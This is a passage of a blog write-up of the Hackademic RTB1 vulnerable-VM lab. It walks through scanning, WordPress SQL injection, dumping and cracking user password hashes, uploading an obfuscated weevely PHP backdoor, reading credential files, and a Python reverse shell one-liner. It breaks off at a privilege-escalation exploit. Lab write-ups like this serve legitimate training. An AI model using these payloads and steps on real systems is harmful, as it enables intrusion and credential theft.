@@ -1,0 +1,771 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Hackademic: RTB1 - 0x41414141</title>
+  <meta name="author" content="Norbert Szetei">
+
+  
+  <meta name="description" content="Image: Hackademic: RTB1 We gained the IP address 192.168.80.146 for our testing target. Nmap output: 1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+root@kali32:~# &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://73696e65.github.io/blog/2015/05/29/hackademic-rtb1/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="0x41414141" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">0x41414141</a></h1>
+  
+    <h2>information security notes</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="73696e65.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Hackademic: RTB1</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-29T14:32:12+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>29</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:32 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/hackademic-rtb1,17/">Hackademic: RTB1</a></p>
+
+<p>We gained the IP address 192.168.80.146 for our testing target.</p>
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 192.168.80.146 -sV -p-
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-28 17:14 CEST
+</span><span class='line'>Nmap scan report for 192.168.80.146
+</span><span class='line'>Host is up (0.00032s latency).
+</span><span class='line'>Not shown: 65533 filtered ports
+</span><span class='line'>PORT   STATE  SERVICE VERSION
+</span><span class='line'>22/tcp closed ssh
+</span><span class='line'>80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
+</span><span class='line'>MAC Address: 00:0C:29:01:8A:4D (VMware)
+</span><span class='line'>
+</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 153.05 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nikto output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h 192.168.80.146 
+</span><span class='line'>- Nikto v2.1.6
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Target IP:          192.168.80.146
+</span><span class='line'>+ Target Hostname:    192.168.80.146
+</span><span class='line'>+ Target Port:        80
+</span><span class='line'>+ Start Time:         2015-04-28 17:18:04 (GMT2)
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Server: Apache/2.2.15 (Fedora)
+</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, inode: 12748, size: 1475, mtime: Sun Jan  9 18:22:11 2011
+</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
+</span><span class='line'>+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+</span><span class='line'>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
+</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
+</span><span class='line'>+ 7354 requests: 0 error(s) and 7 item(s) reported on remote host
+</span><span class='line'>+ End Time:           2015-04-28 17:18:15 (GMT2) (11 seconds)
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There was SQL injection on the web page, vulnerable wordpress instance:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.146/Hackademic_RTB1/?cat=1'
+</span><span class='line'>SELECT * FROM wp_categories WHERE cat_ID = 1\\\' LIMIT 1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This will take longer and it&rsquo;s not necessery to dump everything:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u "http://192.168.80.146/Hackademic_RTB1/?cat=1" --dump-all</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Some of the output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>--current-user:
+</span><span class='line'>current user:    'root@localhost'
+</span><span class='line'>--current-db:
+</span><span class='line'>current database:    'wordpress'
+</span><span class='line'>--privileges:
+</span><span class='line'>[*] 'root'@'localhost' (administrator) [27]:
+</span><span class='line'>    privilege: ALTER
+</span><span class='line'>    privilege: ALTER ROUTINE
+</span><span class='line'>    privilege: CREATE
+</span><span class='line'>    privilege: CREATE ROUTINE
+</span><span class='line'>    privilege: CREATE TEMPORARY TABLES
+</span><span class='line'>    privilege: CREATE USER
+</span><span class='line'>    privilege: CREATE VIEW
+</span><span class='line'>    privilege: DELETE
+</span><span class='line'>    privilege: DROP
+</span><span class='line'>    privilege: EVENT
+</span><span class='line'>    privilege: EXECUTE
+</span><span class='line'>    privilege: FILE
+</span><span class='line'>    privilege: INDEX
+</span><span class='line'>    privilege: INSERT
+</span><span class='line'>    privilege: LOCK TABLES
+</span><span class='line'>    privilege: PROCESS
+</span><span class='line'>    privilege: REFERENCES
+</span><span class='line'>    privilege: RELOAD
+</span><span class='line'>    privilege: REPLICATION CLIENT
+</span><span class='line'>    privilege: REPLICATION SLAVE
+</span><span class='line'>    privilege: SELECT
+</span><span class='line'>    privilege: SHOW DATABASES
+</span><span class='line'>    privilege: SHOW VIEW
+</span><span class='line'>    privilege: SHUTDOWN
+</span><span class='line'>    privilege: SUPER
+</span><span class='line'>    privilege: TRIGGER
+</span><span class='line'>    privilege: UPDATE
+</span><span class='line'>--passwords:
+</span><span class='line'>database management system users password hashes:
+</span><span class='line'>[*] root [1]:
+</span><span class='line'>    password hash: 2eaec110380126d7</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The wordpress could be scanned using wpscan too:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# wpscan http://192.168.80.146/Hackademic_RTB1</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# cat wp_users.csv 
+</span><span class='line'>ID,user_idmode,user_ip,user_icq,user_msn,user_yim,user_url,user_aim,user_pass,user_login,user_level,user_email,user_status,user_domain,user_browser,user_nicename,user_nickname,user_lastname,user_firstname,user_registered,user_description,user_activation_key
+</span><span class='line'>1,login,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,21232f297a57a5a743894a0e4a801fc3,NickJames,1,NickJames@hacked.com,0,&lt;blank>,&lt;blank>,nickjames,NickJames,James,Nick,2010-10-25 20:40:23,&lt;blank>,&lt;blank>
+</span><span class='line'>2,login,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,b986448f0bb9e5e124ca91d3d650f52c,JohnSmith,0,JohnSmith@hacked,0,&lt;blank>,&lt;blank>,johnsmith,JohnSmith,Smith,John,2010-10-25 21:25:22,&lt;blank>,&lt;blank>
+</span><span class='line'>3,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,7cbb3252ba6b7e9c422fac5334d22054,GeorgeMiller,10,GeorgeMiller@hacked.com,0,&lt;blank>,&lt;blank>,georgemiller,GeorgeMiller,Miller,George,2011-01-07 03:08:51,&lt;blank>,&lt;blank>
+</span><span class='line'>4,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,a6e514f9486b83cb53d8d932f9a04292,TonyBlack,0,TonyBlack@hacked.com,0,&lt;blank>,&lt;blank>,tonyblack,TonyBlack,Black,Tony,2011-01-07 03:09:55,&lt;blank>,&lt;blank>
+</span><span class='line'>5,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,8601f6e1028a8e8a966f6c33fcd9aec4,JasonKonnors,0,JasonKonnors@hacked.com,0,&lt;blank>,&lt;blank>,jasonkonnors,JasonKonnors,Konnors,Jason,2011-01-07 03:10:36,&lt;blank>,&lt;blank>
+</span><span class='line'>6,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,50484c19f1afdaf3841a0d821ed393d2,MaxBucky,0,MaxBucky@hacked.com,0,&lt;blank>,&lt;blank>,maxbucky,MaxBucky,Bucky,Max,2011-01-07 03:11:18,&lt;blank>,&lt;blank></span></code></pre></td></tr></table></div></figure>
+
+
+<p>&ldquo;GeorgeMiller:q1w2e3&rdquo; has the highest privileges (user_level 10).</p>
+
+<p>We crack the hashes:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# egrep "^[0-9]+" wp_users.csv| awk -F, '{print $10 ":"  $9}'  > /tmp/wp_users.john
+</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# john /tmp/wp_users.john --format=raw-md5 
+</span><span class='line'>Loaded 6 password hashes with no different salts (Raw MD5 [128/128 SSE2 intrinsics 12x])
+</span><span class='line'>NickJames:admin
+</span><span class='line'>JohnSmith:PUPPIES
+</span><span class='line'>GeorgeMiller:q1w2e3
+</span><span class='line'>TonyBlack:napoleon
+</span><span class='line'>JasonKonnors:maxwell
+</span><span class='line'>MaxBucky:kernel
+</span><span class='line'>guesses: 6  time: 0:00:00:01 DONE (Tue Apr 28 18:16:40 2015)  c/s: 7580K  trying: kernel - kernit
+</span><span class='line'>Use the "--show" option to display all of the cracked passwords reliably</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We log in using GeorgeMiller&rsquo;s account and under &ldquo;Manage -> Files&rdquo; we upload the generated weevely shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely generate 1234
+</span><span class='line'><span class="o">[</span>generate.php<span class="o">]</span> Backdoor file <span class="s1">&#39;weevely.php&#39;</span> created with password <span class="s1">&#39;1234&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">root</span><span class="o">@</span><span class="nx">kali32</span><span class="o">:~/.</span><span class="nx">sqlmap</span><span class="o">/</span><span class="nx">output</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">80.146</span><span class="o">/</span><span class="nx">dump</span><span class="o">/</span><span class="nx">wordpress</span><span class="c1"># cat weevely.php </span>
+</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'><span class="nv">$duiq</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;sc&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;scssctscrsc_scrsceplscasccsce&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="nv">$lucw</span><span class="o">=</span><span class="s2">&quot;MoJGEpPjMpeyRrPSczNCcwoh7ZWNobyAnPwohCcuJGsuJz4nO2V2YWwoYmFzZTY0X2RlwohY29wohkZShwoh&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$udtq</span><span class="o">=</span><span class="s2">&quot;JGM9J2NvdwohWwoh50JzskYwohT0kX0NPT0tJRTtpZihyZXNlwohdCgkYSwohkwoh9wohPScxMicwohgJwohiYgJG&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$foif</span><span class="o">=</span><span class="s2">&quot;IGpvaW4oYXJywohYXlfc2xpY2UoJGwohEsJGMoJGwohEpLTMpwohKSkpKTtlY2hvICc8LycuwohJGsuJz4nwohO30=&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$kvzf</span><span class="o">=</span><span class="s2">&quot;wcmwohVnX3JlcGxhY2UwohoYXJwohyYwohXkoJy9bXlx3PVxzXSwoh8nLCcvXHMwohvJyksIGFycmF5wohKCcnLCcrJykwohs&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$tkjs</span> <span class="o">=</span> <span class="nv">$duiq</span><span class="p">(</span><span class="s2">&quot;v&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;bvavsve6v4v_vdvevcvovdve&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="nv">$nqkm</span> <span class="o">=</span> <span class="nv">$duiq</span><span class="p">(</span><span class="s2">&quot;d&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;dcdrdedatded_fudncdtdidodn&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="nv">$itsd</span> <span class="o">=</span> <span class="nv">$nqkm</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$tkjs</span><span class="p">(</span><span class="nv">$duiq</span><span class="p">(</span><span class="s2">&quot;woh&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$udtq</span><span class="o">.</span><span class="nv">$lucw</span><span class="o">.</span><span class="nv">$kvzf</span><span class="o">.</span><span class="nv">$foif</span><span class="p">)));</span> <span class="nv">$itsd</span><span class="p">();</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We connect using weevely and found out the mysql root password:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely http://192.168.80.146/Hackademic_RTB1/wp-content/plugins/hello.php 1234
+</span><span class='line'>
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>bin:x:1:1:bin:/bin:/sbin/nologin
+</span><span class='line'>daemon:x:2:2:daemon:/sbin:/sbin/nologin
+</span><span class='line'>adm:x:3:4:adm:/var/adm:/sbin/nologin
+</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
+</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
+</span><span class='line'>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+</span><span class='line'>operator:x:11:0:operator:/root:/sbin/nologin
+</span><span class='line'>games:x:12:100:games:/usr/games:/sbin/nologin
+</span><span class='line'>gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+</span><span class='line'>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+</span><span class='line'>nobody:x:99:99:Nobody:/:/sbin/nologin
+</span><span class='line'>vcsa:x:69:499:virtual console memory owner:/dev:/sbin/nologin
+</span><span class='line'>avahi-autoipd:x:499:498:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin
+</span><span class='line'>ntp:x:38:38::/etc/ntp:/sbin/nologin
+</span><span class='line'>dbus:x:81:81:System message bus:/:/sbin/nologin
+</span><span class='line'>rtkit:x:498:494:RealtimeKit:/proc:/sbin/nologin
+</span><span class='line'>nscd:x:28:493:NSCD Daemon:/:/sbin/nologin
+</span><span class='line'>tcpdump:x:72:72::/:/sbin/nologin
+</span><span class='line'>avahi:x:497:492:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin
+</span><span class='line'>haldaemon:x:68:491:HAL daemon:/:/sbin/nologin
+</span><span class='line'>openvpn:x:496:490:OpenVPN:/etc/openvpn:/sbin/nologin
+</span><span class='line'>apache:x:48:489:Apache:/var/www:/sbin/nologin
+</span><span class='line'>saslauth:x:495:488:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
+</span><span class='line'>mailnull:x:47:487::/var/spool/mqueue:/sbin/nologin
+</span><span class='line'>smmsp:x:51:486::/var/spool/mqueue:/sbin/nologin
+</span><span class='line'>smolt:x:494:485:Smolt:/usr/share/smolt:/sbin/nologin
+</span><span class='line'>sshd:x:74:484:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+</span><span class='line'>pulse:x:493:483:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
+</span><span class='line'>gdm:x:42:481::/var/lib/gdm:/sbin/nologin
+</span><span class='line'>p0wnbox.Team:x:500:500:p0wnbox.Team:/home/p0wnbox.Team:/bin/bash
+</span><span class='line'>mysql:x:27:480:MySQL Server:/var/lib/mysql:/bin/bash</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">@</span><span class="nx">HackademicRTB1</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">Hackademic_RTB1</span> <span class="err">$</span> <span class="nx">cat</span> <span class="nx">wp</span><span class="o">-</span><span class="nx">config</span><span class="o">.</span><span class="nx">php</span>
+</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'><span class="c1">// ** MySQL settings ** //</span>
+</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;wordpress&#39;</span><span class="p">);</span>     <span class="c1">// The name of the database</span>
+</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">);</span>     <span class="c1">// Your MySQL username</span>
+</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;lz5yedns&#39;</span><span class="p">);</span> <span class="c1">// ...and password</span>
+</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">);</span>     <span class="c1">// 99% chance you won&#39;t need to change this value</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Change the prefix if you want to have multiple blogs in a single database.</span>
+</span><span class='line'><span class="nv">$table_prefix</span>  <span class="o">=</span> <span class="s1">&#39;wp_&#39;</span><span class="p">;</span>   <span class="c1">// example: &#39;wp_&#39; or &#39;b2&#39; or &#39;mylogin_&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Change this to localize WordPress.  A corresponding MO file for the</span>
+</span><span class='line'><span class="c1">// chosen language must be installed to wp-includes/languages.</span>
+</span><span class='line'><span class="c1">// For example, install de.mo to wp-includes/languages and set WPLANG to &#39;de&#39;</span>
+</span><span class='line'><span class="c1">// to enable German language support.</span>
+</span><span class='line'><span class="nb">define</span> <span class="p">(</span><span class="s1">&#39;WPLANG&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">/* Stop editing */</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;ABSPATH&#39;</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="k">require_once</span><span class="p">(</span><span class="nx">ABSPATH</span><span class="o">.</span><span class="s1">&#39;wp-settings.php&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Because our web shell doesn&rsquo;t have assigned tty, we use python to create another reverse shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>@HackademicRTB1:/tmp <span class="nv">$ </span>sudo -l
+</span><span class='line'>sudo: sorry, you must have a tty to run sudo
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">root</span><span class="nd">@kali32</span><span class="p">:</span><span class="o">~</span><span class="c"># nc -lp 1338</span>
+</span><span class='line'>
+</span><span class='line'><span class="nd">@HackademicRTB1</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span> <span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&quot;import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(&#39;/bin/bash&#39;)&quot;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">80.137</span> <span class="mi">1338</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>For privilege escalation, we use the following exploit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali32</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">exploitdb</span><span class="err">#</span> <span class="n">head</span> <span class="n">platforms</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="mf">15285.</span><span class="n">c</span>
